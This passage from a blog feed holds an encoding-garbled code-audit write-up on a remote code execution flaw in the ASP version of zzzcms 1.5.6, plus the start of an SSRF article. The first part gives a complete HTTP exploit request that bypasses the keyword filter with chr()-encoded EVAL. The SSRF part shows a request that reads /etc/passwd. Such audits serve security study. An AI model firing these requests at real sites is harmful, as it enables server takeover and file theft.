      <link href="/codeaudit/2024/11/articles/0a257de52c1f1075/"/>
      <url>/codeaudit/2024/11/articles/0a257de52c1f1075/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨4å¹´å‰åœ¨æµè§ˆä¸€ç¯‡æ–‡ç« zzzcms phpå­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚æˆ‘åœ¨æƒ³é‚£ä¹ˆæ—¢ç„¶phpå­˜åœ¨æ¼æ´é‚£ä¹ˆaspç‰ˆæœ¬æœ‰æ²¡æœ‰æ¼æ´å‘¢ã€‚äºæ˜¯åœ¨4å¹´å‰å°±å¯¹è¿™ä¸ªå¼€å§‹å®¡è®¡äº†ã€‚å½“ç„¶è¿™ä¸ªæ¼æ´å®¡è®¡å‡ºæ¥åˆ†äº«ç»™äº†å†…éƒ¨å›¢é˜Ÿçš„äººä¹Ÿä¸èƒ½ç®—äº†ã€‚æˆ‘ä¸€ä¸ªæœ‰æ‰æ˜¯dayå“ˆå“ˆå“ˆã€‚è¿™æ–‡ç« æ˜¯å®¡è®¡æ˜¯4å¹´å‰å†™çš„ã€‚é‚£ä¼šå„¿å±äº0dayæ¼æ´æŠŠã€‚æ”¾å‡ºæ¥å­¦ä¹ å­¦ä¹ aspç‰ˆæœ¬çš„ä»£ç å®¡è®¡å§ã€‚éœ€è¦æ‡‚aspä»£ç è™½ç„¶ç°åœ¨aspç”¨çš„å¤ªå°‘äº†ã€‚å¼€å§‹å§<br>æºä»£ç ç»“æ„æˆªå›¾:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261656228.png" alt="æºä»£ç "></p><h2 id="å®¡è®¡æ­¥éª¤é‡è¦ä»¥ä»£ç å½¢å¼å‘ˆç°"><a href="#å®¡è®¡æ­¥éª¤é‡è¦ä»¥ä»£ç å½¢å¼å‘ˆç°" class="headerlink" title="å®¡è®¡æ­¥éª¤é‡è¦ä»¥ä»£ç å½¢å¼å‘ˆç°"></a>å®¡è®¡æ­¥éª¤é‡è¦ä»¥ä»£ç å½¢å¼å‘ˆç°</h2><p>è°ƒç”¨è¿‡ç¨‹åˆ†æ<br>C:\inetpub\wwwroot\index.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">&lt;!--#include file&#x3D;&quot;inc&#x2F;zzz_client.asp&quot;--&gt;&lt;%if  runMode&#x3D;&quot;1&quot; then aspgo(sitePath&amp;&quot;index&quot;&amp;siteExt)%&gt;</code></pre><p>C:\inetpub\wwwroot\inc\zzz_client.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">&lt;!--#include file&#x3D;&quot;zzz_template.asp&quot;--&gt;&lt;!--#include file&#x3D;&quot;zzz_user.asp&quot;--&gt;&lt;!--#include file&#x3D;&quot;ZZZ_Language.asp&quot;--&gt;&lt;!--#include file&#x3D;&quot;ZZZ_plug.asp&quot;--&gt;&lt;%if ISINSTALL&#x3D;0 and isfolder(sitepath&amp;&quot;install&quot;) then alertgo &quot;ç½‘ç«™å°šæœªå®‰è£…ï¼Œç‚¹å‡»ç¡®å®šè¿›å…¥å®‰è£…ç•Œé¢&quot;,&quot;&#x2F;install&quot;dim act,module,Action,SubAction,id,page,Location,SID,iswap,tag,CPageName,islistpage,iscontentpageif webMode&#x3D;0 then  goto404 siteHelp    act            &#x3D;    GetForm(&quot;act&quot;,&quot;get&quot;)    page        &#x3D;    GetForm(&quot;page&quot;,&quot;get&quot;)    SID            &#x3D;    GetForm(&quot;SID&quot;,&quot;get&quot;)    ID            &#x3D;    GetForm(&quot;id&quot;,&quot;get&quot;)    tag            &#x3D;    GetForm(&quot;tag&quot;,&quot;get&quot;)    Location    &#x3D;    getPagePath   &#39;ä¸ç”¨å¸¦æ‹¬å·è°ƒç”¨</code></pre><p>C:\inetpub\wwwroot\inc\zzz_template.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">  function getPagePath()        response.write(&quot;call me!!!!!!&quot;)        dim NowPath,Modeltype        NowPath&#x3D;getNowPagePath    :    NowPath&#x3D;replacestr(replacestr(NowPath,&quot;go&#x2F;&quot;,&quot;&quot;),&quot;index.asp?&quot;,&quot;&quot;)        if     ifstrin(NowPath,&quot;list_&quot;) then            getPagePath&#x3D;&quot;list&quot;        elseif ifstrin(NowPath,&quot;&#x2F;&quot;) then            getPagePath&#x3D;split(NowPath,&quot;&#x2F;&quot;)(1)        else            getPagePath&#x3D;&quot;&quot;        end if            end function  toLocation act,Location%&gt;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261659940.png" alt="åˆ†ææ‰§è¡Œæˆªå›¾"></p><p>C:\inetpub\wwwroot\inc\zzz_class.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">sub toLocation(act,Location)    dim data    if not isnul(act) then          call selectact(act)    elseif not isnul(Location) then          call selectLocation(Location)    else        Call Zhl.Run_index    end ifend subsub selectLocation(str)    if Asc(left(CPageName,1))&lt;91 and Asc(left(CPageName,1))&gt;64 then        if dbcount(&quot;[dbpre]sort&quot;,&quot;S_URL&#x3D;&#39;&quot;&amp;CPageName&amp;&quot;&#39; and S_onoff&#x3D;1&quot;)&gt;0 then            dim data : data&#x3D;dbload(&quot;[dbpre]sort&quot;,&quot;sid,S_type&quot;,1,&quot;S_URL&#x3D;&#39;&quot;&amp;CPageName&amp;&quot;&#39; and S_onoff&#x3D;1&quot;,&quot;&quot;)            sid&#x3D;data(0,0)                if ifstrin(&quot;product,news,photo,case,down,job,video&quot;,data(1,0)) then                Location&#x3D;&quot;list&quot;            else                Location&#x3D;data(1,0)            end if        end if    end if        if ifPageName(CPageName) then                                data&#x3D;dbload(&quot;[dbpre]content&quot;,&quot;C_sid,CID&quot;,1,&quot;C_pagename&#x3D;&#39;&quot;&amp;CPageName&amp;&quot;&#39;&quot;,&quot;&quot;)        sid&#x3D;data(0,0)        id&#x3D;data(1,0)    end if    Select Case Location        Case &quot;about&quot;    :    Call Zhl.Run_about(SID,Page)        Case &quot;brand&quot;    :    Call Zhl.Run_brand(id,page)        Case &quot;list&quot;,&quot;screen&quot;,&quot;brandlist&quot;    :    Call Zhl.Run_list(Location,SID,Page)        Case &quot;tag&quot;        :    Call Zhl.Run_tag(Location,Page)                Case &quot;product&quot;,&quot;news&quot;,&quot;photo&quot;,&quot;case&quot;,&quot;down&quot;,&quot;job&quot;,&quot;video&quot;,&quot;content&quot;    :    Call Zhl.Run_content(Location,sid,id,page)            Case &quot;search&quot;    :    Call Zhl.Run_search(Location,SID,Page)                Case &quot;comment&quot;    :    Call Run_comment(Location,SID,Page)        Case &quot;submission&quot;    :    Call Run_submission        Case &quot;user&quot;        :    Call Run_user        Case &quot;shop&quot;        :    Call Run_shop        Case &quot;gbook&quot;    :    Call Zhl.Run_gbook        Case &quot;form&quot;        :    Call Zhl.Run_form(id)        Case replace(adminPath,&quot;&#x2F;&quot;,&quot;&quot;)    :    aspgo sitepath&amp;adminPath&amp;&quot;login.asp&quot;        Case else        :    Call Zhl.Run_other()        &#39;case else  : echop request.serverVariables(&quot;URL&quot;)&amp;&quot;act:&quot;&amp;act&amp;&quot;ã€€Location:&quot;&amp;Location&amp;&quot;ã€€SID:&quot;&amp;SID&amp;&quot;ã€€id:&quot;&amp;id&amp;&quot;ã€€page:&quot;&amp;page    End Selectend sub</code></pre><p>C:\inetpub\wwwroot\inc\zzz_template.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">&#39;ç”Ÿæˆ[æœç´¢ç»“æœ]é™æ€é¡µé¢    Function Run_search(Location,sid,page)        dim rs,content,sql        searchkeys&#x3D;enhtml(getform(&quot;keys&quot;,&quot;both&quot;))            if not isnul(searchkeys) then setcookie &quot;searchkeys&quot;,searchkeys else searchkeys&#x3D;getcookie(&quot;searchkeys&quot;)            searchtype&#x3D;enhtml(getform(&quot;type&quot;,&quot;both&quot;))            if not isnul(searchtype) then setcookie &quot;searchtype&quot;,searchtype else searchtype&#x3D;getcookie(&quot;searchtype&quot;)            addcookie &quot;cookiekeys&quot;,searchkeys&amp;&quot;|&quot;&amp;searchtype        Call Template_Int()&#39;åˆå§‹åŒ–æ¨¡æ¿        TempFile   &#x3D; TemplateFilePath&amp;&quot;search.html&quot; &#39;æ¨¡æ¿è·¯å¾„        call LoadParse()            call LoadlistParse        zhl.show()    End Function</code></pre><p>C:\inetpub\wwwroot\inc\zzz_template.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">Function Template_Int()        TemplatePath    &#x3D;sitepath &amp;&quot;template&#x2F;pc&#x2F;&quot;&amp; zset.PcTemplate                TemplateFilePath &#x3D; sitepath &amp;&quot;template&#x2F;pc&#x2F;&quot;&amp;zset.PcTemplate&amp;zset.PchtmlPath            Locationpath&#x3D;&quot;&lt;a href&#x3D;&#39;&quot;&amp;sitePath&amp;&quot;&#39;&gt;&quot;&amp;str_index&amp;&quot;&lt;&#x2F;a&gt;&quot;        CacheFolder &#x3D;sitepath&amp;CachePath        htmlFolder  &#x3D;sitepath&amp;htmlDir        pluginspath &#x3D;sitepath&amp;&quot;plugins&#x2F;&quot;    End Function    public sub LoadParse()            ZContent &#x3D; loadFile(TempFile)    call ParseTopAndFoot()        call ParseGlobal()    &#39;åº•å±‚åŸºç¡€    end sub&#39;æ‰©å±•è§£æ    public sub LoadlistParse()    call parseDBLoop()    &#39;åˆ—è¡¨å¾ªç¯    call parseDBLoop()    &#39;åˆ—è¡¨å¾ªç¯    call parseAdLoop()    &#39;å¹¿å‘Š        call ParseLabels()    &#39;è‡ªå®šä¹‰æ ‡ç­¾        call Parsepics()    &#39;ç›¸å†Œ    call LoadplugLoop()    call parsehidestr()    &#39;éšè—*    call parseleftstr()    &#39;å·¦ä¾§æˆªå–    call parseformatDate()    &#39;æ ¼å¼åŒ–æ—¶é—´        call parsecounts()    &#39;ç»Ÿè®¡æ•°é‡    call parseDBLoop()    &#39;åˆ—è¡¨å¾ªç¯        call parseIf(&quot;&quot;)    &#39;è§£æåˆ¤æ–­    end sub&#39;è§£æif    Public Function parseIf(str)     &#39;response.write(str&amp;&quot;test&quot;)    &#39;response.write(&quot;####################################3&quot;)    &#39; Exit Function        on error resume next        if not ifStrin(Zcontent,&quot;&#123;if&quot;&amp;str&amp;&quot;:&quot;) then Exit Function        dim mif,matchesIf,strIf,strThen,strThen1,strElse1,iflabel2,iflabel3        dim ifFlag,ElseArray,ElseIfSubArray,ElseArrayLen,ReStr,ElseLen,strElseIf,strElseIfThen,elseIfFlag        iflabel&#x3D;&quot;&#123;if&quot;&amp;str&amp;&quot;:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&quot;&amp;str&amp;&quot;&#125;&quot;        iflabel2&#x3D;&quot;&#123;elseif&quot;&amp;str&amp;&quot;&quot;        iflabel3&#x3D;&quot;&#123;else&quot;&amp;str&amp;&quot;&#125;&quot;        elseIfFlag&#x3D;false        Zreg.Pattern&#x3D;iflabel        set matchesIf&#x3D;Zreg.Execute(Zcontent)        for each mif in matchesIf            strIf&#x3D;mif.SubMatches(0):strThen&#x3D;mif.SubMatches(1)            if instr(strThen,iflabel2)&gt;0 then                ElseArray&#x3D;split(strThen,iflabel2)                ElseArrayLen&#x3D;ubound(ElseArray)                ElseIfSubArray&#x3D;split(ElseArray(ElseArrayLen),iflabel3)                ReStr&#x3D;ElseIfSubArray(1)                                Execute(&quot;if &quot;&amp;strIf&amp;&quot; then ReStr&#x3D;ElseArray(0)&quot;)                for ElseLen&#x3D;1 to ElseArrayLen-1                    strElseIf&#x3D;getSubStrByFromAndEnd(ElseArray(ElseLen),&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;)                    strElseIfThen&#x3D;getSubStrByFromAndEnd(ElseArray(ElseLen),&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)                    Execute(&quot;if &quot;&amp;strElseIf&amp;&quot; then ReStr&#x3D;strElseIfThen&quot;)                    Execute(&quot;if &quot;&amp;strElseIf&amp;&quot; then elseIfFlag&#x3D;true else  elseIfFlag&#x3D;false&quot;)                    if elseIfFlag then exit for                next                Execute(&quot;if &quot;&amp;getSubStrByFromAndEnd(ElseIfSubArray(0),&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;)&amp;&quot; then ReStr&#x3D;getSubStrByFromAndEnd(ElseIfSubArray(0),&quot;&quot;&#125;&quot;&quot;,&quot;&quot;&quot;&quot;,&quot;&quot;start&quot;&quot;):elseIfFlag&#x3D;true&quot;)                Zcontent&#x3D;replace(Zcontent,mif.value,ReStr)            else                if instr(strThen,&quot;&#123;else&quot;&amp;str&amp;&quot;&#125;&quot;)&gt;0 then                    strThen1&#x3D;split(strThen,iflabel3)(0)                    strElse1&#x3D;split(strThen,iflabel3)(1)                                        Execute(&quot;if &quot;&amp;strIf&amp;&quot; then ifFlag&#x3D;true else ifFlag&#x3D;false&quot;)                    if err then die &quot;åˆ¤æ–­æ ‡ç­¾æœ‰è¯¯è¯·ä¿®æ­£&lt;br&gt;&quot;&amp;strIf&amp;err.number&amp;err.description                    if ifFlag then Zcontent&#x3D;replace(Zcontent,mif.value,strThen1) else Zcontent&#x3D;replace(Zcontent,mif.value,strElse1)                else                          &#39;response.write(&quot;---------------------&quot;&amp;vbcrlf)                      &#39; response.write(strIf&amp;vbcrlf)                           &#39; response.write(&quot;---------------------&quot;&amp;vbcrlf)                                            Execute(&quot;if &quot;&amp;strIf&amp;&quot; then ifFlag&#x3D;true else ifFlag&#x3D;false&quot;)  &#x2F;&#x2F;æ¼æ´ç‚¹                    &#39;Execute(strIf)                    &#39;exit function                    if err then die &quot;åˆ¤æ–­æ ‡ç­¾æœ‰è¯¯è¯·ä¿®æ­£&lt;br&gt;&quot;&amp;strIf&amp;err.number&amp;err.description                    if ifFlag then Zcontent&#x3D;replace(Zcontent,mif.value,strThen) else Zcontent&#x3D;replace(Zcontent,mif.value,&quot;&quot;)                end if            end if            elseIfFlag&#x3D;false        next        set matchesIf&#x3D;nothing                    if ifStrin(Zcontent,&quot;&#123;if1:&quot;) then parseIf(&quot;1&quot;) else Exit Function        if ifStrin(Zcontent,&quot;&#123;if2:&quot;) then parseIf(&quot;2&quot;) else Exit Function        if ifStrin(Zcontent,&quot;&#123;if3:&quot;) then parseIf(&quot;3&quot;) else Exit Function        if ifStrin(Zcontent,&quot;&#123;if4:&quot;) then parseIf(&quot;4&quot;) else Exit Function        if ifStrin(Zcontent,&quot;&#123;if5:&quot;) then parseIf(&quot;5&quot;) else Exit Function            End Function</code></pre><p>C:\inetpub\wwwroot\inc\zzz_mian.asp</p><pre class="language-asp" data-language="asp"><code class="language-asp">&#39;è·å¾—è¡¨å•    public function getForm( byval element,byval getType)  &#x2F;&#x2F;è¿‡æ»¤postè¯·æ±‚å‚æ•° è¿™ä¸ªå¯ä»¥ç»•è¿‡        on error resume next        getType&#x3D;lcase(getType)        dim s,e        select case getType            case &quot;get&quot;,&quot;both&quot;                if isRewrite and URLQueryString&lt;&gt;&quot;&quot; then                    aArray &#x3D; split(URLQueryString,&quot;&amp;&quot;)                    element &#x3D; lcase(element)                    for iI &#x3D; 0 To ubound(aArray)                        i &#x3D; instr(aArray(iI),&quot;&#x3D;&quot;)                        if i &gt; 0 then                            e &#x3D; lcase(left(aArray(iI),i-1))                            if element &#x3D; e then s &#x3D; mid(aArray(iI),i+1)                        end if                    next                end if                if s&#x3D;&quot;&quot; then s &#x3D; request.queryString(element)                if getType&#x3D;&quot;both&quot; and s&#x3D;&quot;&quot; then s &#x3D; request.form(element)            case &quot;post&quot;                s &#x3D; request.form(element)        end select        &#39;å¦‚æœå‚æ•°é‡Œé¢æœ‰ä¸‹é¢è¿™ä¸ªå­—ç¬¦é‚£ä¹ˆç›´æ¥æŠ¥é”™  å¤§å†™ç»•è¿‡        if ifstrin(s,&quot;execute&quot;) or ifstrin(s,&quot;request&quot;) or ifstrin(s,&quot;eval&quot;)  or ifstrin(s,&quot;script&quot;) or ifstrin(s,&quot;çˆ ç…¥æ•µç‘³&quot;) or ifstrin(s,&quot;â” &quot;)  or ifstrin(s,&quot;â”¼&quot;) then            getForm&#x3D;&quot;&quot;            errlog filterPara(s),&quot;&quot;            if evalsendmail&#x3D;1 then sendmail Receive_email,zset.siteTitle&amp;&quot;ç½‘ç«™æœ‰äººè¯•å›¾æ³¨å…¥,IP&quot;&amp;getip(),&quot;ç½‘å€:&quot;&amp;zset.siteUrl&amp;&quot;&lt;&#x2F;br&gt;é¡¹ç›®ï¼šç•™è¨€ä¿¡æ¯&lt;&#x2F;br&gt;è¡¨å•ï¼š&quot;&amp;element&amp;&quot;&lt;&#x2F;br&gt;ç±»å‹ï¼š&quot;&amp;getType&amp;&quot;&lt;&#x2F;br&gt;è¯­å¥ï¼š&quot;&amp;s            goto404 &quot;è¯·ä¸è¦å°è¯•æ³¨å…¥ï¼Œæ‚¨çš„ipå·²è®°å½•&quot;        else            getForm &#x3D; enhtml(trim(s))        end if        if err.number&lt;&gt;0 then err.clear    end functionfunction enhtml(byval strs)     &#39;è¿‡æ»¤è„šæœ¬ å¯ä»¥ç»•è¿‡        reg.pattern &#x3D;&quot;&lt;script.+?&#x2F;script&gt;&quot;        strs&#x3D;reg.replace(strs,&quot;&quot;)        reg.pattern &#x3D;&quot;&lt;iframe.+?&#x2F;iframe&gt;&quot;        strs&#x3D;reg.replace(strs,&quot;&quot;)        strs &#x3D; Replace(strs,&quot;%&quot;,&quot;&amp;#037;&quot;)    &#39;strs&#x3D;replace(strs,&quot;&amp;&quot;,&quot;&amp;&quot;)        strs&#x3D;replace(strs,&quot;&#39;&quot;,&quot;&#39;&quot;)        strs&#x3D;replace(strs,&quot;&quot;&quot;&quot;,&quot;&amp;#34;&quot;)    &#39;strs&#x3D;replace(strs,&quot;&lt;&quot;,&quot;&lt;&quot;)    &#39;strs&#x3D;replace(strs,&quot;&gt;&quot;,&quot;&gt;&quot;)        reg.pattern&#x3D;&quot;(w)(here)&quot;        strs&#x3D;reg.replace(strs,&quot;$1h&amp;#101;re&quot;)        reg.pattern&#x3D;&quot;(s)(elect)&quot;        strs&#x3D;reg.replace(strs,&quot;$1el&amp;#101;ct&quot;)        reg.pattern&#x3D;&quot;(i)(nsert)&quot;        strs&#x3D;reg.replace(strs,&quot;$1ns&amp;#101;rt&quot;)        reg.pattern&#x3D;&quot;(e)(xecute)&quot;        strs&#x3D;reg.replace(strs,&quot;$exe&amp;#101;ute&quot;)                reg.pattern&#x3D;&quot;(r)(equest)&quot;        strs&#x3D;reg.replace(strs,&quot;$r&amp;#101;epuest&quot;)                reg.pattern&#x3D;&quot;(c)(reate)&quot;        strs&#x3D;reg.replace(strs,&quot;$1r&amp;#101;ate&quot;)                reg.pattern&#x3D;&quot;(d)(rop)&quot;        strs&#x3D;reg.replace(strs,&quot;$1ro&amp;#112;&quot;)        reg.pattern&#x3D;&quot;(a)(lter)&quot;        strs&#x3D;reg.replace(strs,&quot;$1lt&amp;#101;r&quot;)        reg.pattern&#x3D;&quot;(d)(elete)&quot;        strs&#x3D;reg.replace(strs,&quot;$1el&amp;#101;te&quot;)        reg.pattern&#x3D;&quot;(u)(pdate)&quot;        strs&#x3D;reg.replace(strs,&quot;$1p&amp;#100;ate&quot;)        reg.pattern&#x3D;&quot;(\s)(or)&quot;        strs&#x3D;reg.replace(strs,&quot;$1o&amp;#114;&quot;)        reg.pattern&#x3D;&quot;(java)(script)&quot;        strs&#x3D;reg.replace(strs,&quot;$1scri&amp;#112;t&quot;)        reg.pattern&#x3D;&quot;(j)(script)&quot;        strs&#x3D;reg.replace(strs,&quot;$1scri&amp;#112;t&quot;)        reg.pattern&#x3D;&quot;(vb)(script)&quot;        strs&#x3D;reg.replace(strs,&quot;$1scri&amp;#112;t&quot;)                if instr(strs,&quot;expression&quot;)&lt;&gt;0 then            strs&#x3D;replace(strs,&quot;expression&quot;,&quot;e&amp;#173;xpression&quot;,1,-1,0)        end if        enhtml&#x3D;strs    end function</code></pre><p>å­˜åœ¨æ¼æ´çš„ç‚¹ä¸º:<br>    Execute(â€œif â€œ&amp;strIf&amp;â€ then ifFlag&#x3D;true else ifFlag&#x3D;falseâ€)</p><pre class="language-asp" data-language="asp"><code class="language-asp">exp:   èšå‰‘ç›´æ¥è¿æ¥zzzcms 1.5.6 asp EXPPOST &#x2F;search&#x2F;index.asp HTTP&#x2F;1.1Host: www.fuckcms.comContent-Length: 159Cache-Control: max-age&#x3D;0Origin: http:&#x2F;&#x2F;www.fuckcms.comUpgrade-Insecure-Requests: 1DNT: 1Content-Type: application&#x2F;x-www-form-urlencodedUser-Agent: Mozilla&#x2F;5.0 (Windows NT 6.3; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;72.0.3626.81 Safari&#x2F;537.36 SE 2.X MetaSr 1.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8Referer: http:&#x2F;&#x2F;www.fuckcms.com&#x2F;search&#x2F;Accept-Language: zh-CN,zh;q&#x3D;0.9Cookie: zzz847_usercheck&#x3D;0; zzz847_keys&#x3D;sdasfsdf; ASPSESSIONIDQQACCRSD&#x3D;NOPNDKFAENGFMJJFGPOKKHIG; ASPSESSIONIDSSAABRTC&#x3D;JNBLPMFANFHIGFALOMABOGEO; ASPXSpy&#x3D;; ASPSESSIONIDQQBADRSC&#x3D;DMOFDLGAMMPMACNNOIPJICJC; zzz%5F&#x3D;errval&#x3D;%3Ca+href%3D%27http%3A%2F%2Fzzzcms%2Ecom%2Fnews%2F%3Fbits32%2Ehtml%27+target%3D%27%5Fblank%27%3E1%2E%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E5%90%AF%E7%94%A832%E4%BD%8D%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E3%80%82%3C%2Fa%3E%3Cbr%3E%3Ca+href%3D%27http%3A%2F%2Fzzzcms%2Ecom%2Fnews%2F%3Ffolderaccess%2Ehtml%27+target%3D%27%5Fblank%27%3E2%2E%E6%A3%80%E6%9F%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%83%E9%99%90%E3%80%82%3C%2Fa%3E&amp;cookiekeys&#x3D;xxxxxxx%7C%2Cxxxx%7C%2Ccccc%7C%2C111%7C&amp;oldpath&#x3D;8Lk9Sk6Mc%2F&amp;errdesc&#x3D;&amp;question&#x3D;test&amp;siteurl&#x3D;http%3A%2F%2Fwww%2Efuckcms%2Ecom%2F&amp;errtitle&#x3D;%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5&amp;password&#x3D;49ba59abbe56e057&amp;dbdata&#x3D;1&amp;username&#x3D;admin&amp;dbtype&#x3D;0&amp;searchkeys&#x3D;xxxxxxx&amp;errid&#x3D;0&amp;answer&#x3D;test&amp;sitename&#x3D;testConnection: closekeys&#x3D;&#123;if:EVAL(EVAL(chr(114)%2bchr(101)%2bchr(113)%2bchr(117)%2bchr(101)%2bchr(115)%2bchr(116))(chr(97)))&#125;&#123;end if&#125;&amp;a&#x3D;response.write(chr(98)%2bchr(98)%2bchr(99))</code></pre><p>æ‰§è¡Œæˆªå›¾<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411261704086.png" alt="æ¼æ´æ‰§è¡Œæˆªå›¾"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ä»£ç å®¡è®¡è¦å…¨æ–¹ä½å¤šè¯­è¨€å®¡è®¡æ‰èƒ½å‘ç°åˆ«äººå‘ç°ä¸äº†çš„æˆ–è€…ä¸ä¼šçš„ä¸œä¸œã€‚ä»Šå¤©å°±åˆ°è¿™é‡Œå§ã€‚è¿™é‡Œä¸»è¦æ˜¯å±•ç¤ºæ¼æ´æ‰§è¡Œæµç¨‹å’Œç»•è¿‡é˜²æŠ¤è¿›è¡Œä»£ç æ‰§è¡Œã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CodeAudit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeAuditExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨æˆ‘ä»¬çš„è½¯ä»¶ç¼–å†™ssrfæ¼æ´å®æˆ˜æ¡ˆä¾‹</title>
      <link href="/securitytools/2024/11/articles/2a9c16adbff1ef3f/"/>
      <url>/securitytools/2024/11/articles/2a9c16adbff1ef3f/</url>
      
        <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æˆ‘ä»¬åœ¨å®æˆ˜çš„æ—¶å€™é‡åˆ°ä»»æ„æ–‡ä»¶è¯»å–æˆ–è€…æ˜¯ssrfæ¼æ´æ¥è¯´ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´é‚£ä¸ªå¦‚æœæœ‰å›æ˜¾å¯ä»¥ç›´æ¥æ ¹æ®å›æ˜¾å‘é€post getåŒ…å°±è¡Œäº†ã€‚å¦‚æœæ²¡æœ‰å›æ˜¾é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ç¼–å†™è¿™ç§æ¼æ´çš„expã€‚ä¾‹å¦‚:å¦‚ä¸‹æ¼æ´<br><a href="https://mp.weixin.qq.com/s/Cr1XIUkge36cGYtpHtw1Dw">https://mp.weixin.qq.com/s/Cr1XIUkge36cGYtpHtw1Dw</a><br>æ¼æ´exp:</p><pre class="language-sh" data-language="sh"><code class="language-sh">GETÂ &#x2F;api&#x2F;wxapps&#x2F;_requestPost?url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&amp;data&#x3D;1Â HTTP&#x2F;2Host:Â 127.0.0.1Sec-Ch-Ua:Â &quot;(Not(A:Brand&quot;;v&#x3D;&quot;8&quot;,Â &quot;Chromium&quot;;v&#x3D;&quot;101&quot;Sec-Ch-Ua-Mobile:Â ?0Sec-Ch-Ua-Platform:Â &quot;Windows&quot;Upgrade-Insecure-Requests:Â 1User-Agent:Â Mozilla&#x2F;5.0Â (WindowsÂ NTÂ 10.0;Â Win64;Â x64)Â AppleWebKit&#x2F;537.36Â (KHTML,Â likeÂ Gecko)Â Chrome&#x2F;101.0.4951.54Â Safari&#x2F;537.36Accept:Â text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Sec-Fetch-Site:Â noneSec-Fetch-Mode:Â navigateSec-Fetch-User:Â ?1Sec-Fetch-Dest:Â documentAccept-Encoding:Â gzip,Â deflateAccept-Language:Â zh-CN,zh;q&#x3D;0.9Connection:Â close</code></pre><p>ä½¿ç”¨å†…ç½®Â curl_execå‡½æ•°å‘é€è¯·æ±‚ã€‚æ¼æ´åŸç†</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ä¸å¸¦æŠ¥å¤´çš„curl</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_requestPost</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$ssl</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token comment">//curlå®Œæˆ</span>    <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//è®¾ç½®curlé€‰é¡¹</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//URL</span>    <span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0 FirePHP/0.7.4'</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_USERAGENT</span><span class="token punctuation">,</span> <span class="token variable">$user_agent</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//user_agentï¼Œè¯·æ±‚ä»£ç†ä¿¡æ¯</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_AUTOREFERER</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//refererå¤´ï¼Œè¯·æ±‚æ¥æº</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token 